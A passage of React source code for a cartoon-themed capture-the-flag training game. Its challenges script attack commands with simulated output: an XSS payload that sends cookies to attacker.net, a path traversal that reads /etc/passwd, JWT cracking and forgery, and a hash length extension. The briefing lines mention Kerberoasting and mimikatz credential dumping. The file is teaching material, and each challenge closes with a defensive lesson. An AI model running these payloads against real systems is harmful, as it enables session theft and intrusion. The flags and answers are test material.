import { useState, useEffect, useRef, useCallback } from "react";

// ══════════════════════════════════════════════════════════════════
// DARKWING — Round 2
// New: 14 challenges · Briefing Room · Operator Dossier · Replay · Mode Toggle
// ══════════════════════════════════════════════════════════════════

// ── THEMES ───────────────────────────────────────────────────────
const THEMES = {
  darkops: {
    id:"darkops", name:"DARK OPS", icon:"🦇", desc:"Purple / Teal / Gold",
    bg:"#0A0A18", bgCard:"#11112A", bgDeep:"#060610",
    purple:"#3A2480", purpleHi:"#5A3CAF", purpleDim:"#1A1038",
    teal:"#00DEC4", gold:"#F7CC44", slate:"#1C1C36", slateHi:"#2E2E52",
    text:"#E4E4F8", textDim:"#9090C4", textFade:"#5555A0",
    red:"#FF4466", green:"#00FF88", accent:"#00DEC4", accentAlt:"#F7CC44",
    termPrompt:"#00DEC4", termOutput:"#CCEADD",
  },
  negaduck: {
    id:"negaduck", name:"NEGADUCK", icon:"🦹", desc:"Red / Black / Yellow",
    bg:"#100404", bgCard:"#1E0808", bgDeep:"#090202",
    purple:"#7A0000", purpleHi:"#A01414", purpleDim:"#380606",
    teal:"#FFD700", gold:"#FF5500", slate:"#2E0808", slateHi:"#441414",
    text:"#F0D0D0", textDim:"#C07070", textFade:"#804040",
    red:"#FF2200", green:"#FFD700", accent:"#FF5500", accentAlt:"#FFD700",
    termPrompt:"#FF5500", termOutput:"#EED0C0",
  },
  stcanard: {
    id:"stcanard", name:"ST. CANARD DAY", icon:"☀", desc:"Light comic book",
    bg:"#EDEAF8", bgCard:"#FFFFFF", bgDeep:"#E4DFF4",
    purple:"#5B3FD4", purpleHi:"#7B5FE4", purpleDim:"#D4CCEE",
    teal:"#007A6C", gold:"#B86E00", slate:"#D8D4F0", slateHi:"#C8C4EC",
    text:"#14083C", textDim:"#5A5090", textFade:"#9890C0",
    red:"#CC0033", green:"#006644", accent:"#007A6C", accentAlt:"#B86E00",
    termPrompt:"#5B3FD4", termOutput:"#201860",
  },
};

// ── SOUND ENGINE ─────────────────────────────────────────────────
class SoundEngine {
  constructor() { this.ctx = null; this.enabled = true; }
  init() {
    if (!this.ctx) { try { this.ctx = new (window.AudioContext || window.webkitAudioContext)(); } catch(e) {} }
    if (this.ctx?.state === "suspended") this.ctx.resume();
  }
  play(type) {
    if (!this.enabled || !this.ctx) return;
    try {
      const b = (f,v,t,d) => { const o=this.ctx.createOscillator(),g=this.ctx.createGain(); o.connect(g); g.connect(this.ctx.destination); o.type=t||"sine"; o.frequency.value=f; g.gain.setValueAtTime(v,this.ctx.currentTime); g.gain.exponentialRampToValueAtTime(0.001,this.ctx.currentTime+d); o.start(); o.stop(this.ctx.currentTime+d); };
      switch(type) {
        case "keypress":    b(800,0.03,"square",0.04); break;
        case "enter":       b(600,0.08,"square",0.06); break;
        case "error":       [400,300,200].forEach((f,i)=>setTimeout(()=>b(f,0.08,"sawtooth",0.06),i*40)); break;
        case "output":      b(400,0.02,"sawtooth",0.03); break;
        case "flag":        [523,659,784,1047].forEach((f,i)=>setTimeout(()=>b(f,0.12,"sine",0.15),i*100)); break;
        case "achievement": [880,1100,1320,1760].forEach((f,i)=>setTimeout(()=>b(f,0.1,"sine",0.12),i*80)); break;
        case "rankup":      [392,494,587,698,784,988,1568].forEach((f,i)=>setTimeout(()=>b(f,0.14,"triangle",0.2),i*120)); break;
        case "briefing":    [300,400,350].forEach((f,i)=>setTimeout(()=>b(f,0.08,"sine",0.1),i*80)); break;
        case "navigate":    b(700,0.04,"sine",0.05); break;
        case "quack":       (() => { const o=this.ctx.createOscillator(),g=this.ctx.createGain(); o.connect(g); g.connect(this.ctx.destination); o.type="sawtooth"; o.frequency.setValueAtTime(350,this.ctx.currentTime); o.frequency.linearRampToValueAtTime(200,this.ctx.currentTime+0.15); o.frequency.linearRampToValueAtTime(300,this.ctx.currentTime+0.25); g.gain.setValueAtTime(0.2,this.ctx.currentTime); g.gain.exponentialRampToValueAtTime(0.001,this.ctx.currentTime+0.3); o.start(); o.stop(this.ctx.currentTime+0.3); })(); break;
        case "hint":        b(500,0.1,"sine",0.08); break;
        case "daily":       b(660,0.1,"sine",0.12); setTimeout(()=>b(880,0.12,"sine",0.18),130); break;
        case "replay":      [400,500,600].forEach((f,i)=>setTimeout(()=>b(f,0.08,"sine",0.1),i*60)); break;
      }
    } catch(e) {}
  }
}
const soundEngine = new SoundEngine();
const haptic = {
  enabled:true, light:()=>haptic.enabled&&navigator.vibrate?.(10),
  medium:()=>haptic.enabled&&navigator.vibrate?.(25), heavy:()=>haptic.enabled&&navigator.vibrate?.(50),
  error:()=>haptic.enabled&&navigator.vibrate?.([30,20,30]),
  success:()=>haptic.enabled&&navigator.vibrate?.([10,50,10,50,80]),
  rankup:()=>haptic.enabled&&navigator.vibrate?.([50,30,50,30,100,50,150]),
};

// ── PERSISTENCE ───────────────────────────────────────────────────
const SAVE_KEY = "darkwing_save_v2";
const defaultSave = () => ({
  onboarded:false, playerHandle:"OPERATIVE", opMode:"junior",
  totalXP:0, hintTokens:3, totalScore:0,
  solvedFlags:{}, starRatings:{}, completedMissions:{},
  achievements:[], hintState:{}, visitedCities:["stcanard"],
  dailySolvedDate:null, streak:1, lastLoginDate:null,
  totalTimePlayed:0, sessionStart:Date.now(),
  settings:{ soundEnabled:true, hapticsEnabled:true, theme:"darkops", version:"2.0.0" },
  leaderboard:[
    {handle:"0xDEADBEEF",score:1250,solves:7,country:"🇺🇸"},
    {handle:"n0p_sled",score:950,solves:5,country:"🇩🇪"},
    {handle:"buffer_bunny",score:800,solves:5,country:"🇷🇺"},
    {handle:"r00tk1t",score:675,solves:4,country:"🇬🇧"},
    {handle:"xpl01t_queen",score:550,solves:3,country:"🇧🇷"},
    {handle:"YOU",score:0,solves:0,country:"🎯",isPlayer:true},
  ],
});
const loadSave = () => {
  try { const r=localStorage.getItem(SAVE_KEY); if(!r) return defaultSave(); const p=JSON.parse(r); const d=defaultSave(); return {...d,...p,settings:{...d.settings,...(p.settings||{})}}; }
  catch(e) { return defaultSave(); }
};
const persistSave = s => { try { localStorage.setItem(SAVE_KEY,JSON.stringify(s)); } catch(e) {} };

// ── RANKS ─────────────────────────────────────────────────────────
const RANKS = [
  {label:"SCRIPT KIDDIE",  minXP:0,    color:"#00C9B1",icon:"🐣"},
  {label:"RECON OPS",      minXP:300,  color:"#00C9B1",icon:"👁"},
  {label:"EXPLOIT DEV",    minXP:700,  color:"#F5C842",icon:"💉"},
  {label:"RED TEAMER",     minXP:1200, color:"#F5C842",icon:"🎯"},
  {label:"SHADOW OPERATOR",minXP:2000, color:"#4A2C8F",icon:"🦇"},
  {label:"NATION STATE",   minXP:3000, color:"#FF4466",icon:"☠"},
];
const getRank    = xp => [...RANKS].reverse().find(r=>xp>=r.minXP)||RANKS[0];
const getNextRank= xp => RANKS.find(r=>r.minXP>xp)||null;

// ── ACHIEVEMENTS ──────────────────────────────────────────────────
const ACH_DEFS = [
  {id:"first_blood",    icon:"🩸",label:"FIRST BLOOD",    desc:"Capture your first flag",           xp:50 },
  {id:"no_hints_1",    icon:"🧤",label:"CLEAN HANDS",     desc:"Solve with zero hints",             xp:75 },
  {id:"speed_run",     icon:"⚡",label:"SPEED DEMON",      desc:"Solve in under 60 seconds",        xp:100},
  {id:"three_stars",   icon:"⭐",label:"TRIPLE THREAT",    desc:"Get 3 stars on any challenge",     xp:80 },
  {id:"quack_found",   icon:"🦆",label:"FOUND THE DUCK",  desc:"Discover Ducky's secret command",  xp:999},
  {id:"daily_1",       icon:"📅",label:"DAILY OPS",        desc:"Complete first daily challenge",   xp:75 },
  {id:"all_web",       icon:"🌐",label:"WEB SLINGER",      desc:"Complete all WEB challenges",      xp:150},
  {id:"all_crypto",    icon:"🔐",label:"CRYPTKEEPER",      desc:"Complete all CRYPTO challenges",   xp:150},
  {id:"all_forensics", icon:"🔬",label:"CSI: CYBER",       desc:"Complete all FORENSICS challenges",xp:150},
  {id:"all_privesc",   icon:"⬆", label:"ROOT CAUSE",       desc:"Complete all PRIVESC challenges",  xp:200},
  {id:"map_explorer",  icon:"🗺",label:"WORLD TRAVELER",   desc:"Visit every city on the map",      xp:120},
  {id:"negaduck_found",icon:"🦹",label:"NEGADUCK SIGHTED", desc:"Read a NegaDuck intercept",        xp:50 },
  {id:"settings_found",icon:"⚙", label:"CONTROL FREAK",   desc:"Open settings",                    xp:10 },
  {id:"replay_1",      icon:"🔁",label:"PERFECTIONIST",   desc:"Replay a solved challenge",        xp:40 },
  {id:"city_clear",    icon:"🏆",label:"CITY CLEARED",     desc:"Solve all challenges in a city",  xp:200},
  {id:"tokyo_clear",   icon:"🇯🇵",label:"TOKYO DRIFT",     desc:"Clear all Tokyo challenges",       xp:150},
  {id:"dossier_viewed",icon:"🪪",label:"KNOW THYSELF",    desc:"Open your operator dossier",       xp:20 },
  {id:"ten_flags",     icon:"🚩",label:"FLAG COLLECTOR",   desc:"Capture 10 flags",                 xp:100},
];

// ── HINT TIERS ────────────────────────────────────────────────────
const HINT_TIERS = [
  {tier:1,label:"NUDGE",    cost:1,penalty:5, color:"#00FF88"},
  {tier:2,label:"DIRECTION",cost:2,penalty:15,color:"#F5C842"},
  {tier:3,label:"SOLUTION", cost:3,penalty:30,color:"#FF4466"},
];

// ── OPERATIVE MODES ───────────────────────────────────────────────
const OP_MODES = {
  junior:{
    label:"JUNIOR OPERATIVE",icon:"🐣",color:"#00C9B1",
    negaLines:["Mwahaha! I've hacked the pizza delivery app! ALL PIZZA COMES TO ME!","NegaDuck's evil plan: Step 1 — hack everything. Step 2 — ???","I changed all the WiFi passwords! Now only I know them! GENIUS."],
    storyPrefix:"NegaDuck is causing CARTOON CHAOS —",missionTone:"Your mission (it'll be fun):",
    briefingPrefix:"🦆 Ducky says:",
  },
  shadow:{
    label:"SHADOW OPERATIVE",icon:"🦇",color:"#F5C842",
    negaLines:["St. Canard's infrastructure belongs to me. Tell Darkwing his duck is too late.","Three steps ahead since you started. The question is what I take first.","You found me? Impressive. Stopping me is another matter entirely."],
    storyPrefix:"NegaDuck's crew has infiltrated",missionTone:"Intel received. Your objective:",
    briefingPrefix:"🦆 Ducky briefs:",
  },
  dark:{
    label:"DARK OPERATIVE",icon:"☠",color:"#FF4466",
    negaLines:["SIGINT: 'The city systems are already compromised. They just don't know it yet.'","INTERCEPT: 'Every operative they send is another data point. Let them come.'","CLASSIFIED: 'St. Canard was a proof of concept. The real targets are the seven cities.'"],
    storyPrefix:"SIGINT confirms NEGADUCK has breached",missionTone:"CLASSIFIED BRIEFING — EYES ONLY:",
    briefingPrefix:"🦆 DUCKY INTEL:",
  },
};

// ── DUCKY BRIEFING LINES ──────────────────────────────────────────
const BRIEFINGS = {
  // St. Canard
  tut01:["Welcome to DARKWING. Ducky here. First lesson: know your environment.","Type whoami. That's rule zero for every operative."],
  xss01:["NegaDuck's web devs trust user input. Big mistake.","Look for places the app echoes your text back — that's your attack surface."],
  dir01:["Ducky tip: web servers sometimes leave the fridge door open.","Check every path. Robots.txt told you where to look."],
  // Las Vegas
  web01:["Vegas baby. NegaDuck loves casinos — easy targets, lots of traffic.","robots.txt is basically a treasure map. Read it carefully."],
  jwt01:["The casino uses JWT tokens. Ducky has seen this before.","Decode it first. The header tells you everything you need to crack it."],
  hash01:["Hash length extension — this one's spicy. Ducky is excited.","The server trusts a MAC you can forge without the key. Wild, right?"],
  // Indianapolis
  osi01:["Home turf. NegaDuck thought he was safe here. He wasn't.","Git history is forever. Ducky has the receipts."],
  shodan01:["Shodan sees everything connected to the internet. Everything.","Search the target's IP range. NegaDuck left devices exposed."],
  linkedin01:["OSINT isn't just technical. People leak intel constantly.","Check job postings, LinkedIn, and GitHub profiles. The org chart is public."],
  // London
  for01:["GCHQ flagged this one. Ducky coordinated with their team.","EXIF data is a spy's nightmare. Check every image."],
  stego01:["Something is hidden inside that image. Not in the pixels — in the bits.","LSB steganography. The message is in the least significant bits."],
  mem01:["Memory forensics. Ducky loves this one — it's like archaeology.","Volatility reads memory dumps. Running processes, network connections, passwords."],
  // Tokyo
  net01:["Tokyo LAN. NegaDuck's crew runs MITM here constantly.","ARP poison the victim. All their traffic flows through you."],
  mitm01:["Credentials in cleartext. Still. In 2024.","Intercept the session. tcpdump captures everything on cleartext protocols."],
  deep01:["Mobile deeplink hijacking. NegaDuck's app registered a fake scheme.","The app trusts incoming deeplinks without validation. Classic."],
  // Moscow
  prv01:["Moscow. This is where NegaDuck's nation-state backing lives.","SUID python3. GTFOBins. You know what to do."],
  kerb01:["Kerberoasting. The crown jewel of Active Directory attacks.","Request a service ticket for any SPN. Then crack it offline. No admin needed."],
  mimi01:["Mimikatz. If you have SYSTEM you have everything.","sekurlsa::logonpasswords dumps cached credentials from LSASS memory."],
  // Sao Paulo
  cld01:["NegaDuck went cloud-native. Ducky had to learn AWS to keep up.","S3 bucket misconfiguration. The most common cloud finding. Check every bucket."],
  lambda01:["Lambda function with overprivileged IAM role. Classic cloud mistake.","If the function can call STS, you can escalate to admin."],
  iam01:["IAM privilege escalation. Ducky calls this 'permission creep exploitation'.","Find an IAM policy that lets you attach more policies. Then attach AdministratorAccess."],
};
const getBriefing = id => BRIEFINGS[id] || ["Ducky says: stay sharp, operative.","You've got this. NegaDuck doesn't."];

// ── DUCKY DIALOGUE ────────────────────────────────────────────────
const DUCKY = {
  welcome:["Hey! I'm Ducky — your guide. Let's get dangerous! 🦆","Every great operative starts somewhere. Ducky's got your back."],
  quack:["QUACK QUACK QUACK! You found the secret! 🦆\n\nDucky's Lore: NegaDuck had all the skills. All the knowledge. He chose the wrong side.\nThat's why Ducky trains YOU.\n— The Ducky Protocol, Ch.1","Oh! You typed quack! 🦆\n\nSecret Intel: St. Canard wasn't NegaDuck's first target. It was his TEST.\n— Ducky, signing off"],
  missionStart:["Alright, focus up! This one needs sharp eyes. 🦆","Think like the attacker. Then out-think them.","Ducky tip: recon before you wreck, always."],
  missionDone:["QUACK! That's how it's done! 🦆","You're getting dangerous. Ducky approves.","Nice work! The shadows are your friend."],
  chalStart:["NegaDuck thinks you can't solve this. Prove him wrong.","Ducky's watching. Don't embarrass us. 🦆","This is where it gets fun."],
  wrongCmd:["That's not quite right. Think harder!","Ducky facepalm. 🤦 Try again.","Hmm. What would Darkwing do?"],
  hintUsed:["No shame in hints. Even heroes ask for backup. 🦆","Learn the concept, not just the answer."],
  flagCaptured:["FLAG CAPTURED! Ducky does a victory waddle! 🦆🦆","QUACK QUACK QUACK! You're dangerous now!","NegaDuck never saw it coming."],
  rankUp:["NEW RANK! The shadows just got darker. 🦆","Let's. Get. DANGEROUS! Rank achieved!"],
  noHints:["No hints?! You're a natural. Ducky is shook. 🦆","Clean solve! That's elite operator energy."],
  achievement:["Achievement unlocked! Ducky approves. 🦆","That's going in the dossier. Nice work."],
  daily:["Daily challenge time! Fresh intel just dropped. 🦆","Every day sharper. Every day more dangerous."],
  replay:["Replay mode! Ducky respects the grind. 🦆","Chasing those 3 stars? Ducky has done the same.","No hints this time. You know the playbook."],
};
const duck = k => { const p=DUCKY[k]; if(!p) return ""; return p[Math.floor(Math.random()*p.length)]; };
const calcStars = (e,h,w) => { if(h>=2||w>=5) return 1; if(h===1||w>=3||e>90) return 2; return 3; };
const normalize = s => s.toLowerCase().replace(/['"]/g,"'").replace(/\s+/g," ").trim();
const catColor  = c => ({WEB:"#00C9B1",CRYPTO:"#9B59B6",FORENSICS:"#F5C842",PRIVESC:"#FF4466",OSINT:"#00FF88",RECON:"#F5C842",NETWORK:"#00AAFF",MOBILE:"#FF8800",CLOUD:"#44FFAA",TUTORIAL:"#F5C842",AD:"#FF6644"})[c]||"#00C9B1";
const catIcon   = c => ({WEB:"🌐",CRYPTO:"🔐",FORENSICS:"🔬",PRIVESC:"⬆",OSINT:"🔍",RECON:"📡",NETWORK:"📶",MOBILE:"📱",CLOUD:"☁",TUTORIAL:"🎓",AD:"🏢"})[c]||"◆";
const diffColor = d => d==="EASY"||d==="NOVICE"?"#00C9B1":d==="MEDIUM"||d==="INTERMEDIATE"?"#F5C842":"#FF4466";
const CMD_SUGG  = ["nmap -sV","curl","sqlmap","hashcat","gobuster","exiftool","tcpdump","git log","sudo -l","find /","strings","base64 -d","echo","cat","ls -la","quack","volatility","aws s3 ls","impacket-GetUserSPNs","mimikatz"];

// ── CITIES ────────────────────────────────────────────────────────
const CITIES = [
  {id:"stcanard",    name:"St. Canard",    flag:"🏠",x:22,y:38,type:"HOME",  category:"TUTORIAL·WEB"},
  {id:"lasvegas",    name:"Las Vegas",     flag:"⚡",x:13,y:35,type:"ACTIVE", category:"WEB·CRYPTO"},
  {id:"indianapolis",name:"Indianapolis",  flag:"🦆",x:22,y:30,type:"ACTIVE", category:"OSINT·RECON"},
  {id:"london",      name:"London",        flag:"🇬🇧",x:45,y:25,type:"ACTIVE", category:"FORENSICS"},
  {id:"tokyo",       name:"Tokyo",         flag:"🇯🇵",x:78,y:30,type:"ACTIVE", category:"NETWORK·MOBILE"},
  {id:"moscow",      name:"Moscow",        flag:"🇷🇺",x:58,y:22,type:"ACTIVE", category:"PRIVESC·AD"},
  {id:"saopaulo",    name:"Sao Paulo",     flag:"🇧🇷",x:30,y:68,type:"ACTIVE", category:"CLOUD"},
];

// ── ALL CTF CHALLENGES ────────────────────────────────────────────
const CTF_CHALLENGES = [
  // ── ST. CANARD ──────────────────────────────────────────────────
  {id:"tut01",category:"TUTORIAL",city:"stcanard",title:"DARKWING BOOT CAMP",tier:1,points:25,difficulty:"EASY",requires:[],
    description:"Welcome operative. Run your first recon command.",story:"Ducky's training environment in St. Canard. This is where every operative begins.",
    hints:[{tier:1,text:"Type the command in the hint strip below."},{tier:2,text:"whoami tells you who you are on the system."},{tier:3,text:"whoami — press Enter."}],
    steps:[{cmd:"whoami",hint:"Check your user identity",output:`darkwing_operative\n\n[*] Identity confirmed. Welcome, operative.\n[*] Let's get dangerous.`},{cmd:"ls -la /missions",hint:"List mission files",output:`-rw-r--r-- mission_01.txt\n-rw-r--r-- negaduck_intercept.enc\n-rw-r--r-- flag.txt\n\n[*] NegaDuck intercept detected. Investigate.`},{cmd:"cat /missions/flag.txt",hint:"Read the flag file",aliases:["cat flag.txt","cat /missions/flag.txt"],output:`CTF{w3lc0m3_t0_d4rkw1ng}\n\n[!!!] FLAG CAPTURED — Submit it above to complete the mission.`}],
    flag:"CTF{w3lc0m3_t0_d4rkw1ng}",lesson:"Always know your environment. whoami, id, uname -a — run these first on every new shell.",tags:["tutorial"]},

  {id:"xss01",category:"WEB",city:"stcanard",title:"SCRIPT INJECTION",tier:2,points:100,difficulty:"EASY",requires:["tut01"],
    description:"NegaDuck's St. Canard portal reflects user input unsanitized. Inject a script.",story:"The HQ portal has a search box. NegaDuck's devs never sanitized it.",
    hints:[{tier:1,text:"XSS works when the app echoes your input back as HTML."},{tier:2,text:"Try injecting <script>alert(1)</script> in the search field."},{tier:3,text:"curl 'http://hq.stcanard.local/search?q=<script>alert(document.cookie)</script>'"}],
    steps:[{cmd:"curl 'http://hq.stcanard.local/search?q=<script>alert(1)</script>'",hint:"Test for reflected XSS",output:`HTTP/1.1 200 OK\n\n<div class="results">You searched for: <script>alert(1)</script></div>\n\n[!!!] XSS CONFIRMED — input reflected without sanitization`},{cmd:"curl 'http://hq.stcanard.local/search?q=<script>document.location=\"http://attacker.net/steal?c=\"+document.cookie</script>'",hint:"Steal session cookies via XSS",output:`[*] Victim browser executed payload\n[*] Cookie exfiltrated to attacker.net:\n    session=eyJhbGciOiJIUzI1NiJ9.admin.abc123\n\nFLAG: CTF{xss_r3fl3ct3d_c00k13_st34l}\n[!!!] SESSION HIJACKED — FLAG CAPTURED`}],
    flag:"CTF{xss_r3fl3ct3d_c00k13_st34l}",lesson:"Sanitize ALL user input before rendering. Use Content-Security-Policy headers. HttpOnly cookies prevent JS access.",tags:["web","xss"]},

  {id:"dir01",category:"WEB",city:"stcanard",title:"DIRECTORY TRAVERSAL",tier:2,points:100,difficulty:"EASY",requires:["tut01"],
    description:"The HQ file server has a path traversal vulnerability. Read /etc/passwd.",story:"NegaDuck's file server joins user input to a base path without validation.",
    hints:[{tier:1,text:"Directory traversal uses ../ sequences to escape the intended directory."},{tier:2,text:"Try ../../../etc/passwd as the filename parameter."},{tier:3,text:"curl 'http://files.stcanard.local/download?file=../../../etc/passwd'"}],
    steps:[{cmd:"curl 'http://files.stcanard.local/download?file=../../../etc/passwd'",hint:"Test path traversal to read /etc/passwd",output:`root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nnegaduck:x:1001:1001:NegaDuck Operative:/home/negaduck:/bin/bash\n\nFLAG: CTF{p4th_tr4v3rs4l_r34ds_4ny_f1l3}\n[!!!] FLAG CAPTURED — /etc/passwd exposed`}],
    flag:"CTF{p4th_tr4v3rs4l_r34ds_4ny_f1l3}",lesson:"Never concatenate user input into file paths. Use allowlists of permitted filenames. Jail the process with chroot.",tags:["web","traversal"]},

  // ── LAS VEGAS ───────────────────────────────────────────────────
  {id:"web01",category:"WEB",city:"lasvegas",title:"ROBOTS IN PLAIN SIGHT",tier:1,points:50,difficulty:"EASY",requires:[],
    description:"The casino portal hides paths in robots.txt. Find the flag.",story:"NegaDuck's crew hit the Vegas casino network during DEFCON. They left the door open.",
    hints:[{tier:1,text:"robots.txt tells crawlers what NOT to index — which is exactly what you want."},{tier:2,text:"curl http://target.corp/robots.txt"},{tier:3,text:"curl http://target.corp/robots.txt then curl the Disallow path"}],
    steps:[{cmd:"curl http://target.corp/robots.txt",hint:"Fetch robots.txt",output:`User-agent: *\nDisallow: /admin\nDisallow: /secret-flag-dir\n\n[*] /secret-flag-dir — investigate`},{cmd:"curl http://target.corp/secret-flag-dir",hint:"Fetch the hidden path",output:`FLAG: CTF{r0b0ts_4r3_n0t_s3cur1ty}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{r0b0ts_4r3_n0t_s3cur1ty}",lesson:"robots.txt is a roadmap for attackers. Never list sensitive paths there.",tags:["web","recon"]},

  {id:"jwt01",category:"CRYPTO",city:"lasvegas",title:"JWT FORGERY",tier:2,points:150,difficulty:"MEDIUM",requires:["web01"],
    description:"The casino API uses JWTs signed with HS256 and a weak secret. Forge an admin token.",story:"NegaDuck's casino API uses 'secret' as the JWT signing key. Seriously.",
    hints:[{tier:1,text:"JWT has three base64 parts: header.payload.signature. Decode the payload first."},{tier:2,text:"If signed with a weak secret, hashcat can crack it. Use mode 16500."},{tier:3,text:"hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt then forge with the cracked secret"}],
    steps:[{cmd:"echo 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.abc' | cut -d. -f2 | base64 -d",hint:"Decode the JWT payload",output:`{"user":"guest","role":"user"}\n\n[*] Role field found — target: role=admin\n[*] Crack the signing secret with hashcat mode 16500`},{cmd:"hashcat -a 0 -m 16500 casino.jwt /usr/share/wordlists/rockyou.txt",hint:"Crack the JWT signing secret",output:`Token: eyJhbGciOiJIUzI1NiJ9....\nSecret found: secret\n\n[*] Forge new token with role=admin using 'secret' as key`},{cmd:"python3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'},'secret',algorithm='HS256'))\"",hint:"Forge an admin JWT token",output:`eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.forged_sig\n\n[*] Sending forged token to /api/admin...\nHTTP/1.1 200 OK\n{"flag":"CTF{jwt_w34k_s3cr3t_f0rg3d}","role":"admin"}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{jwt_w34k_s3cr3t_f0rg3d}",lesson:"Use RS256 (asymmetric) instead of HS256 for JWTs. Enforce strong secrets. Rotate secrets regularly. Validate alg header.",tags:["crypto","jwt","web"]},

  {id:"hash01",category:"CRYPTO",city:"lasvegas",title:"LENGTH EXTENSION",tier:3,points:200,difficulty:"HARD",requires:["jwt01"],
    description:"The casino API uses SHA256(secret+data) for MAC. Perform a hash length extension attack.",story:"NegaDuck's MAC implementation is textbook vulnerable. The secret length is 16 bytes.",
    hints:[{tier:1,text:"Hash length extension works on SHA256/MD5 when MAC = hash(secret + data)."},{tier:2,text:"Use hash_extender tool or Python's hashpumpy to extend the hash."},{tier:3,text:"hashpumpy.hashpump(existing_sig, existing_data, append_data, secret_length)"}],
    steps:[{cmd:"python3 -c \"import hashpumpy; sig,data = hashpumpy.hashpump('abc123sig','user=guest','&role=admin',16); print(sig,data)\"",hint:"Perform hash length extension",output:`New signature: deadbeef1234...\nNew data: user=guest\\x80\\x00...&role=admin\n\n[*] Forged request ready`},{cmd:"curl -H 'X-Signature: deadbeef1234' 'http://casino-api.target/admin?user=guest%80%00...%26role=admin'",hint:"Send the forged request",output:`HTTP/1.1 200 OK\n{"status":"ok","role":"admin","flag":"CTF{l3ngth_3xt3ns10n_4tt4ck}"}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{l3ngth_3xt3ns10n_4tt4ck}",lesson:"Never use hash(secret+data) for MACs. Use HMAC which is immune to length extension. SHA-3 is also immune.",tags:["crypto","mac","advanced"]},

  // ── INDIANAPOLIS ────────────────────────────────────────────────
  {id:"osi01",category:"OSINT",city:"indianapolis",title:"GITHUB SECRETS",tier:1,points:100,difficulty:"EASY",requires:[],
    description:"NegaDuck's dev committed an API key to GitHub. Find it.",story:"Home turf. NegaDuck's Indianapolis cell made a rookie mistake.",
    hints:[{tier:1,text:"Deleting from git doesn't erase history. Every commit persists."},{tier:2,text:"git log --all --oneline shows every commit."},{tier:3,text:"git clone then git log --all --oneline then git show <hash>"}],
    steps:[{cmd:"git clone https://github.com/target/webapp && cd webapp && git log --all --oneline",hint:"Clone and inspect history",output:`a1b2c3d Remove sensitive config\n8h9i0j1 Add API integration  ← SUSPICIOUS`},{cmd:"git show 8h9i0j1",hint:"Show the suspicious commit",output:`+SECRET_FLAG = "CTF{g1t_h1st0ry_1s_f0r3v3r}"\n+API_KEY = "sk-prod-abc123xyz"\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{g1t_h1st0ry_1s_f0r3v3r}",lesson:"Use gitleaks in CI. Rotate any key ever committed. git history persists after deletion.",tags:["osint","git"]},

  {id:"shodan01",category:"OSINT",city:"indianapolis",title:"SHODAN RECON",tier:2,points:125,difficulty:"EASY",requires:["osi01"],
    description:"Use Shodan to find NegaDuck's exposed devices in the Indianapolis IP range.",story:"NegaDuck's sleeper cell left IoT devices exposed. Shodan sees everything.",
    hints:[{tier:1,text:"Shodan indexes every internet-connected device. Search by IP range or org name."},{tier:2,text:"Search: org:'NegaDuck Industries' OR net:192.168.10.0/24"},{tier:3,text:"shodan search 'org:NegaDuck Industries port:22' then shodan host <IP>"}],
    steps:[{cmd:"shodan search 'org:NegaDuck Industries port:22,80,8080'",hint:"Search Shodan for NegaDuck's exposed services",output:`Results: 4 devices found\n192.168.10.5:22  OpenSSH 7.4 — Indianapolis HQ\n192.168.10.12:80 Apache 2.4 — Backup Server\n192.168.10.44:8080 Tomcat — Dev Environment\n192.168.10.99:23 Telnet — OLD ROUTER\n\n[!!!] Telnet router exposed to internet`},{cmd:"shodan host 192.168.10.99",hint:"Get full details on the exposed router",output:`IP: 192.168.10.99\nPorts: 23 (telnet)\nOrg: NegaDuck Industries\nBanner: Welcome to NegaDuck Router v1.0\nAdmin credentials: admin/admin\nFlag in banner: CTF{sh0d4n_s33s_4ll_d3v1c3s}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{sh0d4n_s33s_4ll_d3v1c3s}",lesson:"Monitor your internet exposure with Shodan alerts. Default credentials are found in minutes. Telnet should never be internet-facing.",tags:["osint","shodan","recon"]},

  {id:"linkedin01",category:"OSINT",city:"indianapolis",title:"SOCIAL ENGINEERING RECON",tier:2,points:125,difficulty:"EASY",requires:["osi01"],
    description:"Map NegaDuck Industries' org chart using LinkedIn and job postings.",story:"People leak intelligence constantly. The org chart is basically public.",
    hints:[{tier:1,text:"LinkedIn, job postings, GitHub profiles, and conference talks all reveal org structure."},{tier:2,text:"Search LinkedIn for 'NegaDuck Industries' — look for job titles, tech stack, email patterns."},{tier:3,text:"theHarvester -d negaduck.com -b linkedin,google then check emails for patterns"}],
    steps:[{cmd:"theHarvester -d negaduck.com -b linkedin,google,bing",hint:"Harvest emails and employee data",output:`[*] Searching LinkedIn...\nEmails found:\n  j.smith@negaduck.com\n  admin@negaduck.com\n  cto@negaduck.com\n\nEmployees found:\n  John Smith — Lead Developer\n  Sarah Jones — DevOps Engineer\n  Mike Chen — Security (ironic)\n\n[*] Email pattern: firstname.lastname@negaduck.com`},{cmd:"curl 'https://api.hunter.io/v2/domain-search?domain=negaduck.com&api_key=demo'",hint:"Verify email pattern and find more addresses",output:`{"data":{"emails":[{"value":"j.smith@negaduck.com","confidence":92},{"value":"m.chen@negaduck.com","confidence":88},{"value":"flag@negaduck.com","confidence":100}]}}\n\nFlag email content: CTF{0s1nt_0rg_ch4rt_m4pp3d}\n\n[!!!] FLAG CAPTURED`}],
    flag:"CTF{0s1nt_0rg_ch4rt_m4pp3d}",lesson:"Train employees on OSINT exposure. Limit LinkedIn visibility. Use generic email patterns. Conduct regular OSINT assessments on yourself.",tags:["osint","social","recon"]},

  // ── LONDON ──────────────────────────────────────────────────────
  {id:"for01",category:"FORENSICS",city:"london",title:"METADATA LEAKS",tier:1,points:75,difficulty:"EASY",requires:[],
    description:"Extract EXIF metadata from NegaDuck's London op photo.",story:"GCHQ flagged the image. EXIF was never stripped.",
